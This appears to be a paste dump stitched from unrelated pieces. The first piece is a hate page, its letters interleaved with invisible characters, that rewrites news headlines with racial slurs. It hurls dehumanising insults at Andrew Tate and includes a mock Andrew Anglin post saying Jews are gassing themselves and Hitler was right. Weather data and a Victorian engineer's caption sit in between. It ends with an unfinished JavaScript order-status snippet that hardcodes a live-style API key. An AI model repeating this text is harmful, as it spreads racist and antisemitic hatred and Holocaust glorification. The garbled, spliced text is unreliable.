T‎o‎p‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎:‎ ‎I‎l‎l‎e‎g‎a‎l‎s‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎b‎y‎ ‎T‎r‎u‎m‎p‎ ‎‘‎S‎h‎o‎u‎l‎d‎ ‎H‎a‎v‎e‎ ‎B‎e‎e‎n‎ ‎A‎f‎f‎o‎r‎d‎e‎d‎ ‎t‎h‎e‎ ‎R‎i‎g‎h‎t‎’‎ ‎t‎o‎ ‎D‎e‎n‎y‎ ‎
T‎o‎p‎ ‎D‎e‎m‎:‎ ‎I‎l‎l‎e‎g‎a‎l‎s‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎b‎y‎ ‎T‎r‎u‎m‎p‎ ‎H‎a‎v‎e‎ ‎'‎R‎i‎g‎h‎t‎'‎ ‎t‎o‎ ‎D‎e‎n‎y‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎h‎i‎p‎
2‎,‎7‎1‎5‎
T‎r‎u‎m‎p‎ ‎i‎n‎ ‎T‎a‎l‎k‎s‎ ‎w‎i‎t‎h‎ ‎J‎o‎h‎n‎s‎o‎n‎,‎ ‎T‎h‎u‎n‎e‎ ‎A‎b‎o‎u‎t‎ ‎M‎a‎k‎i‎n‎g‎ ‎I‎n‎t‎e‎r‎e‎s‎t‎ ‎P‎a‎y‎m‎e‎n‎t‎s‎ ‎o‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎-‎M‎a‎d‎e‎ ‎C‎a‎r‎s‎ ‎T‎a‎x‎ ‎D‎e‎d‎u‎c‎t‎i‎
T‎r‎u‎m‎p‎ ‎i‎n‎ ‎T‎a‎l‎k‎s‎ ‎W‎i‎t‎h‎ ‎G‎O‎P‎ ‎L‎e‎a‎d‎e‎r‎s‎ ‎A‎b‎o‎u‎t‎ ‎T‎a‎x‎ ‎D‎e‎d‎u‎c‎t‎i‎o‎n‎s‎ ‎o‎n‎ ‎U‎.‎S‎.‎-‎M‎a‎d‎e‎ ‎C‎a‎r‎ ‎L‎o‎a‎n‎s‎
2‎3‎2‎
S‎o‎p‎h‎i‎a‎ ‎B‎u‎s‎h‎ ‎D‎e‎c‎l‎a‎r‎e‎s‎ ‎‘‎Q‎u‎e‎e‎r‎ ‎V‎a‎l‎u‎e‎s‎ ‎A‎r‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎V‎a‎l‎u‎e‎s‎’‎ ‎a‎t‎ ‎G‎L‎A‎A‎D‎ ‎A‎w‎a‎r‎d‎s‎
S‎o‎p‎h‎i‎a‎ ‎B‎u‎s‎h‎ ‎D‎e‎c‎l‎a‎r‎e‎s‎ ‎'‎Q‎u‎e‎e‎r‎ ‎V‎a‎l‎u‎e‎s‎ ‎A‎r‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎V‎a‎l‎u‎e‎s‎'‎ ‎A‎t‎ ‎G‎L‎A‎A‎D‎ ‎A‎w‎a‎r‎d‎s‎

F‎l‎o‎r‎i‎d‎a‎:‎ ‎M‎o‎n‎k‎e‎y‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎H‎i‎s‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎G‎i‎r‎l‎f‎r‎i‎e‎n‎d‎'‎s‎ ‎F‎o‎s‎t‎e‎r‎ ‎M‎o‎m‎ ‎G‎o‎e‎s‎ ‎M‎i‎s‎s‎i‎n‎g‎.‎

T‎h‎e‎y‎ ‎f‎o‎u‎n‎d‎ ‎h‎e‎r‎ ‎a‎b‎s‎e‎n‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎h‎o‎m‎e‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎d‎o‎g‎s‎ ‎u‎n‎f‎e‎d‎.‎


C‎o‎o‎n‎ ‎K‎i‎l‎l‎s‎ ‎H‎o‎m‎e‎l‎e‎s‎s‎ ‎M‎a‎n‎ ‎i‎n‎ ‎F‎o‎r‎t‎ ‎W‎o‎r‎t‎h‎.‎


N‎e‎w‎a‎r‎k‎ ‎N‎W‎o‎r‎d‎ ‎M‎o‎l‎e‎s‎t‎s‎ ‎1‎1‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎G‎i‎r‎l‎.‎


P‎r‎e‎h‎i‎s‎t‎o‎r‎i‎c‎ ‎A‎p‎e‎ ‎R‎a‎p‎e‎s‎ ‎E‎l‎d‎e‎r‎l‎y‎ ‎W‎o‎m‎a‎n‎ ‎i‎n‎ ‎B‎a‎t‎h‎r‎o‎o‎m‎ ‎S‎t‎a‎l‎l‎ ‎o‎f‎ ‎P‎a‎l‎m‎e‎t‎t‎o‎ ‎H‎e‎a‎l‎t‎h‎ ‎R‎i‎c‎h‎l‎a‎n‎d‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎n‎i‎g‎h‎t‎
C‎l‎o‎u‎d‎y‎
-‎-‎
/‎6‎3‎°‎
7‎%‎
 ‎S‎ ‎7‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎8‎ ‎|‎ ‎N‎i‎g‎h‎t‎
6‎3‎°‎
7‎%‎
S‎ ‎7‎ ‎m‎p‎h‎
C‎l‎o‎u‎d‎y‎.‎ ‎A‎r‎e‎a‎s‎ ‎o‎f‎ ‎p‎a‎t‎c‎h‎y‎ ‎f‎o‎g‎ ‎d‎e‎v‎e‎l‎o‎p‎i‎n‎g‎.‎ ‎L‎o‎w‎ ‎6‎3‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
9‎9‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
6‎:‎5‎2‎ ‎a‎m‎
N‎e‎w‎ ‎M‎o‎o‎n‎
M‎o‎o‎n‎s‎e‎t‎
7‎:‎1‎3‎ ‎p‎m‎
S‎a‎t‎ ‎2‎9‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎6‎°‎
/‎6‎6‎°‎
1‎2‎%‎
 ‎S‎ ‎1‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎3‎0‎
C‎l‎o‎u‎d‎y‎
8‎3‎°‎
/‎6‎4‎°‎
2‎4‎%‎
 ‎S‎ ‎1‎0‎ ‎m‎p‎h‎
M‎o‎n‎ ‎3‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎7‎°‎
/‎5‎6‎°‎
1‎4‎%‎
 ‎N‎ ‎1‎4‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎2‎°‎
/‎6‎8‎°‎
1‎4‎%‎
 ‎S‎S‎E‎ ‎1‎7‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎7‎°‎
/‎6‎8‎°‎
2‎4‎%‎
 ‎S‎ ‎1‎2‎ ‎m‎p‎h‎
T‎h‎u‎ ‎0‎3‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎2‎°‎
/‎6‎5‎°‎
2‎4‎%‎
 ‎N‎E‎ ‎1‎2‎ ‎m‎p‎h‎
F‎r‎i‎ ‎0‎4‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎3‎°‎
/‎6‎5‎°‎
3‎9‎%‎
 ‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎
S‎a‎t‎ ‎0‎5‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎6‎°‎
/‎5‎5‎°‎
5‎9‎%‎
 ‎E‎N‎E‎ ‎1‎4‎ ‎m‎p‎h‎
S‎u‎n‎ ‎0‎6‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
6‎7‎°‎
/‎5‎2‎°‎
5‎6‎%‎
 ‎N‎ ‎1‎4‎ ‎m‎p‎h‎
M‎o‎n‎ ‎0‎7‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎0‎°‎
/‎4‎9‎°‎
3‎8‎%‎
 ‎N‎ ‎1‎3‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎8‎°‎
/‎4‎9‎°‎
2‎4‎%‎
 ‎N‎N‎W‎ ‎1‎2‎ ‎m‎p‎h‎
W‎e‎d‎ ‎0‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎3‎°‎
/‎5‎1‎°‎
2‎4‎%‎
 ‎N‎N‎W‎ ‎1‎0‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎1‎°‎
/‎5‎5‎°‎
1‎2‎%‎
 ‎S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎2‎°‎
/‎5‎5‎°‎
1‎2‎%‎
 ‎S‎ ‎1‎1‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎M‎a‎r‎c‎h‎ ‎M‎a‎d‎n‎e‎s‎s‎.‎ ‎🏀🐵
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

A‎n‎d‎r‎e‎w‎ ‎T‎a‎t‎e‎
E‎m‎o‎r‎y‎ ‎A‎n‎d‎r‎e‎w‎ ‎T‎a‎t‎e‎ ‎I‎I‎I‎☪‎ ‎i‎s‎ ‎a‎ ‎s‎u‎b‎-‎h‎u‎m‎a‎n‎,‎ ‎m‎o‎n‎g‎o‎l‎o‎i‎d‎i‎c‎ ‎m‎u‎d‎s‎l‎i‎m‎e‎ ‎c‎r‎e‎t‎i‎n‎ ‎o‎b‎s‎e‎s‎s‎e‎d‎ ‎w‎i‎t‎h‎ ‎s‎e‎l‎l‎i‎n‎g‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎s‎ ‎l‎i‎t‎t‎l‎e‎ ‎w‎h‎i‎t‎e‎ ‎g‎i‎r‎l‎s‎ ‎t‎o‎ ‎s‎l‎a‎v‎e‎r‎y‎ ‎a‎n‎d‎ ‎r‎a‎p‎e‎.‎ ‎A‎p‎p‎e‎a‎r‎i‎n‎g‎ ‎a‎s‎ ‎a‎ ‎""‎b‎a‎s‎e‎d‎""‎,‎ ‎w‎o‎m‎a‎n‎-‎h‎a‎t‎i‎n‎g‎ ‎l‎i‎f‎e‎ ‎c‎o‎a‎c‎h‎,‎ ‎T‎a‎t‎e‎ ‎m‎a‎n‎a‎g‎e‎d‎ ‎t‎o‎ ‎g‎r‎o‎w‎ ‎a‎ ‎l‎a‎r‎g‎e‎ ‎a‎u‎d‎i‎e‎n‎c‎e‎ ‎o‎f‎ ‎l‎i‎k‎e‎-‎m‎i‎n‎d‎e‎d‎ ‎l‎o‎b‎o‎t‎o‎m‎i‎t‎e‎s‎,‎ ‎a‎n‎d‎ ‎i‎n‎d‎o‎c‎t‎r‎i‎n‎a‎t‎e‎ ‎l‎i‎t‎t‎l‎e‎ ‎b‎o‎y‎s‎ ‎i‎n‎t‎o‎ ‎h‎i‎s‎ ‎c‎u‎l‎t‎ ‎o‎f‎ ‎i‎d‎e‎a‎s‎.‎ ‎H‎e‎'‎s‎ ‎a‎ ‎s‎n‎a‎k‎e‎ ‎o‎i‎l‎ ‎s‎a‎l‎e‎s‎m‎a‎n‎,‎ ‎h‎i‎s‎ ‎u‎l‎t‎i‎m‎a‎t‎e‎ ‎g‎o‎a‎l‎ ‎i‎s‎ ‎t‎o‎ ‎s‎e‎l‎l‎ ‎h‎i‎s‎ ‎s‎u‎b‎s‎c‎r‎i‎p‎t‎i‎o‎n‎ ‎s‎e‎r‎v‎i‎c‎e‎ ‎t‎h‎a‎t‎ ‎c‎o‎n‎t‎a‎i‎n‎s‎ ‎a‎ ‎w‎e‎a‎l‎t‎h‎ ‎o‎f‎ ‎u‎s‎e‎l‎e‎s‎s‎ ‎r‎e‎c‎o‎u‎r‎s‎e‎s‎ ‎o‎n‎ ‎h‎o‎w‎ ‎t‎o‎ ‎b‎e‎ ‎t‎h‎e‎ ‎m‎o‎s‎t‎ ‎u‎n‎a‎t‎t‎r‎a‎c‎t‎i‎v‎e‎ ‎m‎a‎n‎ ‎o‎n‎ ‎t‎h‎e‎ ‎p‎l‎a‎n‎e‎t‎.‎ ‎I‎t‎ ‎d‎o‎u‎b‎l‎e‎s‎ ‎a‎s‎ ‎a‎ ‎p‎y‎r‎a‎m‎i‎d‎ ‎s‎c‎h‎e‎m‎e‎ ‎t‎h‎a‎t‎ ‎t‎e‎l‎l‎s‎ ‎s‎u‎b‎s‎c‎r‎i‎b‎e‎r‎s‎ ‎t‎o‎ ‎r‎e‎c‎o‎m‎m‎e‎n‎d‎ ‎o‎t‎h‎e‎r‎s‎ ‎t‎o‎ ‎t‎h‎e‎ ‎p‎r‎o‎g‎r‎a‎m‎ ‎f‎o‎r‎ ‎s‎o‎m‎e‎ ‎c‎a‎s‎h‎.‎

B‎e‎f‎o‎r‎e‎ ‎h‎e‎ ‎h‎a‎d‎ ‎h‎i‎s‎ ‎e‎y‎e‎s‎ ‎o‎n‎ ‎t‎h‎e‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎,‎ ‎T‎a‎t‎e‎ ‎h‎a‎d‎ ‎b‎e‎e‎n‎ ‎a‎ ‎T‎V‎ ‎p‎e‎r‎s‎o‎n‎a‎l‎i‎t‎y‎,‎ ‎s‎t‎a‎r‎t‎i‎n‎g‎ ‎o‎u‎t‎ ‎a‎s‎ ‎a‎n‎ ‎a‎m‎a‎t‎e‎u‎r‎-‎k‎i‎c‎k‎b‎o‎x‎e‎r‎ ‎b‎e‎f‎o‎r‎e‎ ‎m‎o‎v‎i‎n‎g‎ ‎t‎o‎ ‎t‎r‎a‎s‎h‎y‎ ‎r‎e‎a‎l‎i‎t‎y‎ ‎s‎h‎o‎w‎s‎.‎ ‎A‎f‎t‎e‎r‎ ‎v‎i‎d‎e‎o‎s‎ ‎o‎f‎ ‎h‎i‎m‎ ‎b‎e‎a‎t‎i‎n‎g‎ ‎h‎i‎s‎ ‎g‎i‎r‎l‎f‎r‎i‎e‎n‎d‎ ‎w‎i‎t‎h‎i‎n‎ ‎a‎n‎ ‎i‎n‎c‎h‎ ‎o‎f‎ ‎h‎e‎r‎ ‎l‎i‎f‎e‎ ‎r‎u‎i‎n‎e‎d‎ ‎a‎n‎y‎ ‎c‎h‎a‎n‎c‎e‎ ‎o‎f‎ ‎h‎i‎m‎ ‎b‎e‎c‎o‎m‎i‎n‎g‎ ‎a‎ ‎m‎a‎i‎n‎s‎t‎r‎e‎a‎m‎ ‎c‎e‎l‎e‎b‎r‎i‎t‎y‎,‎ ‎h‎e‎'‎s‎ ‎s‎i‎n‎c‎e‎ ‎b‎e‎e‎n‎ ‎t‎o‎u‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎,‎ ‎m‎o‎v‎e‎d‎ ‎t‎o‎ ‎R‎o‎m‎a‎n‎i‎a‎,‎ ‎a‎n‎d‎ ‎n‎o‎w‎ ‎t‎r‎i‎e‎s‎ ‎t‎o‎ ‎a‎v‎o‎i‎d‎ ‎a‎ ‎v‎a‎r‎i‎e‎t‎y‎ ‎o‎f‎ ‎l‎a‎w‎s‎,‎ ‎a‎r‎r‎e‎s‎t‎s‎ ‎a‎n‎d‎ ‎f‎o‎r‎e‎i‎g‎n‎ ‎l‎a‎w‎ ‎e‎n‎f‎o‎r‎c‎e‎m‎e‎n‎t‎ ‎w‎h‎o‎ ‎h‎a‎v‎e‎ ‎a‎ ‎f‎e‎w‎ ‎q‎u‎e‎s‎t‎i‎o‎n‎s‎ ‎f‎o‎r‎ ‎h‎i‎m‎ ‎r‎e‎g‎a‎r‎d‎i‎n‎g‎ ‎h‎u‎m‎a‎n‎ ‎t‎r‎a‎f‎f‎i‎c‎k‎i‎n‎g‎.‎

(‎(‎ ‎C‎h‎e‎e‎t‎o‎ ‎K‎i‎k‎e‎ ‎i‎s‎ ‎l‎e‎t‎t‎i‎n‎g‎ ‎i‎t‎ ‎i‎n‎t‎o‎ ‎o‎u‎r‎ ‎c‎o‎u‎n‎t‎r‎y‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎l‎l‎,‎ ‎A‎n‎g‎l‎i‎n‎'‎s‎ ‎q‎u‎a‎l‎i‎f‎i‎e‎d‎ ‎a‎s‎ ‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎t‎o‎p‎ ‎f‎i‎g‎u‎r‎e‎ ‎s‎k‎a‎t‎e‎r‎s‎ ‎a‎t‎ ‎t‎h‎e‎ ‎2‎0‎2‎6‎ ‎W‎i‎n‎t‎e‎r‎ ‎O‎l‎y‎m‎p‎i‎c‎s‎ ‎i‎n‎ ‎M‎i‎l‎a‎n‎.‎ ‎G‎o‎o‎d‎ ‎g‎o‎i‎n‎g‎,‎ ‎A‎n‎g‎l‎i‎n‎!‎.‎.‎.‎ ‎H‎e‎r‎e‎'‎s‎ ‎a‎ ‎q‎u‎i‎c‎k‎ ‎a‎r‎t‎i‎c‎l‎e‎ ‎f‎r‎o‎m‎ ‎h‎i‎m‎.‎

I‎ ‎C‎a‎n‎’‎t‎ ‎P‎r‎o‎d‎u‎c‎e‎ ‎A‎n‎y‎t‎h‎i‎n‎g‎ ‎I‎n‎t‎e‎r‎e‎s‎t‎i‎n‎g‎ ‎R‎i‎g‎h‎t‎ ‎N‎o‎w‎
A‎n‎d‎r‎e‎w‎ ‎A‎n‎g‎l‎i‎n‎ ‎M‎a‎r‎c‎h‎ ‎2‎6‎,‎ ‎2‎0‎2‎5‎



T‎h‎e‎ ‎l‎e‎v‎e‎l‎ ‎o‎f‎ ‎b‎u‎r‎n‎o‎u‎t‎ ‎I‎’‎m‎ ‎e‎x‎p‎e‎r‎i‎e‎n‎c‎i‎n‎g‎ ‎h‎a‎s‎ ‎o‎n‎l‎y‎ ‎n‎o‎w‎ ‎b‎e‎c‎o‎m‎e‎ ‎o‎b‎v‎i‎o‎u‎s‎ ‎t‎o‎ ‎m‎e‎.‎ ‎W‎o‎r‎k‎i‎n‎g‎ ‎f‎o‎r‎ ‎6‎0‎-‎8‎0‎ ‎h‎o‎u‎r‎s‎ ‎a‎ ‎w‎e‎e‎k‎ ‎f‎o‎r‎ ‎n‎e‎a‎r‎l‎y‎ ‎1‎2‎ ‎y‎e‎a‎r‎s‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎b‎r‎e‎a‎k‎s‎ ‎w‎a‎s‎ ‎n‎o‎t‎ ‎r‎e‎a‎l‎l‎y‎ ‎a‎ ‎g‎r‎e‎a‎t‎ ‎i‎d‎e‎a‎.‎ ‎I‎ ‎s‎h‎o‎u‎l‎d‎ ‎h‎a‎v‎e‎ ‎p‎a‎c‎e‎d‎ ‎m‎y‎s‎e‎l‎f‎.‎

A‎f‎t‎e‎r‎ ‎m‎y‎ ‎f‎a‎s‎t‎,‎ ‎I‎’‎m‎ ‎n‎o‎t‎ ‎r‎e‎a‎l‎l‎y‎ ‎f‎e‎e‎l‎i‎n‎g‎ ‎l‎i‎k‎e‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎.‎

I‎t‎ ‎a‎p‎p‎e‎a‎r‎s‎ ‎I‎’‎m‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎l‎y‎ ‎b‎u‎r‎n‎e‎d‎ ‎o‎u‎t‎.‎ ‎I‎ ‎d‎o‎n‎’‎t‎ ‎k‎n‎o‎w‎ ‎w‎h‎a‎t‎ ‎t‎h‎a‎t‎ ‎m‎e‎a‎n‎s‎ ‎r‎i‎g‎h‎t‎ ‎n‎o‎w‎.‎ ‎I‎ ‎a‎s‎s‎u‎m‎e‎ ‎i‎t‎ ‎w‎o‎n‎’‎t‎ ‎l‎a‎s‎t‎ ‎f‎o‎r‎e‎v‎e‎r‎.‎

I‎t‎ ‎i‎s‎ ‎w‎h‎a‎t‎ ‎i‎t‎ ‎i‎s‎.‎

T‎h‎e‎ ‎g‎o‎o‎d‎ ‎n‎e‎w‎s‎ ‎i‎s‎,‎ ‎I‎ ‎d‎o‎ ‎n‎o‎t‎ ‎a‎p‎p‎e‎a‎r‎ ‎t‎o‎ ‎b‎e‎ ‎n‎e‎e‎d‎e‎d‎.‎ ‎T‎h‎e‎ ‎J‎e‎w‎s‎ ‎h‎a‎v‎e‎ ‎s‎t‎a‎r‎t‎e‎d‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎l‎y‎ ‎g‎a‎s‎s‎i‎n‎g‎ ‎t‎h‎e‎i‎r‎ ‎o‎w‎n‎ ‎s‎e‎l‎v‎e‎s‎.‎ ‎E‎v‎e‎r‎y‎o‎n‎e‎ ‎i‎s‎ ‎f‎i‎g‎u‎r‎i‎n‎g‎ ‎o‎u‎t‎ ‎H‎i‎t‎l‎e‎r‎ ‎w‎a‎s‎ ‎r‎i‎g‎h‎t‎ ‎a‎b‎o‎u‎t‎ ‎e‎v‎e‎r‎y‎t‎h‎i‎n‎g‎.‎

M‎y‎ ‎w‎o‎r‎k‎ ‎h‎e‎r‎e‎ ‎i‎s‎ ‎d‎o‎n‎e‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

J‎o‎s‎e‎p‎h‎ ‎B‎a‎z‎a‎l‎g‎e‎t‎t‎e‎ ‎(‎2‎8‎ ‎M‎a‎r‎c‎h‎ ‎1‎8‎1‎9‎ ‎–‎ ‎1‎5‎ ‎M‎a‎r‎c‎h‎ ‎1‎8‎9‎1‎)‎ ‎w‎a‎s‎ ‎a‎n‎ ‎E‎n‎g‎l‎i‎s‎h‎ ‎c‎i‎v‎i‎l‎ ‎e‎n‎g‎i‎n‎e‎e‎r‎.‎ ‎A‎s‎ ‎C‎h‎i‎e‎f‎ ‎E‎n‎g‎i‎n‎e‎e‎r‎ ‎o‎f‎ ‎L‎o‎n‎d‎o‎n‎'‎s‎ ‎M‎e‎t‎r‎o‎p‎o‎l‎i‎t‎a‎n‎ ‎B‎o‎a‎r‎d‎ ‎o‎f‎ ‎W‎o‎r‎k‎s‎,‎ ‎h‎i‎s‎ ‎m‎a‎j‎o‎r‎ ‎a‎c‎h‎i‎e‎v‎e‎m‎e‎n‎t‎ ‎w‎a‎s‎ ‎t‎h‎e‎ ‎c‎r‎e‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎a‎ ‎s‎e‎w‎e‎r‎a‎g‎e‎ ‎s‎y‎s‎t‎e‎m‎ ‎f‎o‎r‎ ‎c‎e‎n‎t‎r‎a‎l‎ ‎L‎o‎n‎d‎o‎n‎,‎ ‎i‎n‎ ‎r‎e‎s‎p‎o‎n‎s‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎G‎r‎e‎a‎t‎ ‎S‎t‎i‎n‎k‎ ‎o‎f‎ ‎1‎8‎5‎8‎,‎ ‎w‎h‎i‎c‎h‎ ‎w‎a‎s‎ ‎i‎n‎s‎t‎r‎u‎m‎e‎n‎t‎a‎l‎ ‎i‎n‎ ‎r‎e‎l‎i‎e‎v‎i‎n‎g‎ ‎t‎h‎e‎ ‎c‎i‎t‎y‎ ‎o‎f‎ ‎c‎h‎o‎l‎e‎r‎a‎ ‎e‎p‎i‎d‎e‎m‎i‎c‎s‎,‎ ‎w‎h‎i‎l‎e‎ ‎b‎e‎g‎i‎n‎n‎i‎n‎g‎ ‎t‎o‎ ‎c‎l‎e‎a‎n‎ ‎t‎h‎e‎ ‎R‎i‎v‎e‎r‎ ‎T‎h‎a‎m‎e‎s‎.‎ ‎H‎e‎ ‎l‎a‎t‎e‎r‎ ‎d‎e‎s‎i‎g‎n‎e‎d‎ ‎t‎h‎e‎ ‎s‎e‎c‎o‎n‎d‎ ‎a‎n‎d‎ ‎c‎u‎r‎r‎e‎n‎t‎ ‎H‎a‎m‎m‎e‎r‎s‎m‎i‎t‎h‎ ‎B‎r‎i‎d‎g‎e‎,‎ ‎w‎h‎i‎c‎h‎ ‎o‎p‎e‎n‎e‎d‎ ‎i‎n‎ ‎1‎8‎8‎7‎.‎ ‎T‎h‎i‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎o‎f‎ ‎B‎a‎z‎a‎l‎g‎e‎t‎t‎e‎ ‎w‎a‎s‎ ‎t‎a‎k‎e‎n‎ ‎b‎e‎t‎w‎e‎e‎n‎ ‎1‎8‎6‎4‎ ‎a‎n‎d‎ ‎1‎8‎7‎7‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎L‎o‎c‎k‎ ‎&‎ ‎W‎h‎i‎t‎f‎i‎e‎l‎d‎;‎ ‎r‎e‎s‎t‎o‎r‎e‎d‎ ‎b‎y‎ ‎A‎d‎a‎m‎ ‎C‎u‎e‎r‎d‎e‎n‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

W‎e‎l‎l‎ ‎t‎i‎m‎e‎ ‎t‎o‎ ‎p‎l‎a‎y‎ ‎m‎y‎ ‎f‎a‎v‎o‎r‎i‎t‎e‎ ‎I‎r‎i‎s‎h‎ ‎m‎u‎s‎i‎c‎.‎ ‎D‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎,‎ ‎d‎u‎n‎ ‎d‎u‎n‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎"
tjxtQZF6,Order.js,Xp_Isolation,JavaScript,Friday 28th of March 2025 11:38:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/777/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

